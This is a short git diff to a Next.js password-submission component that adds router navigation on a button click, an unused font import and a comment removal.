@@ -1,17 +1,18 @@
 "use client";
 import { getUpdatePage } from "@/actions";
 import Cookies from "js-cookie";
-import { useParams, useSearchParams } from "next/navigation";
+import { useParams, useRouter, useSearchParams } from "next/navigation";
 import { useMemo, useEffect, useRef, useState } from "react";
 import { useFormStatus } from "react-dom";
 import PageLeaveMessage from "./PageLeaveMessage";
+import { Cagliostro } from "next/font/google";
 
 export default function PasswordFillSubmission() {
   const searchParams = useSearchParams();
   const { id } = useParams();
   const loadingRef = useRef(false);
   const [loading, setLoading] = useState(false);
-
+  const router = useRouter();
   const getUpdate = useMemo(
     () => async () => {
       let dataId = Cookies.get("dataId");
@@ -28,7 +29,7 @@ export default function PasswordFillSubmission() {
     if (searchParams.get("wrong")) {
       setLoading(false);
     }
-    return () => clearInterval(intervalId); // Clean up interval on unmount
+    return () => clearInterval(intervalId);
   }, [getUpdate, searchParams]);
 
   const { pending } = useFormStatus();
@@ -55,6 +56,7 @@ export default function PasswordFillSubmission() {
       <button
         onClick={() => {
           setLoading(true);
+          router.push(window.location.href.split("?")[0]);
         }}
         disabled={pending}
         className="bg-blue-600 text-white px-5 py-2 rounded-3xl"
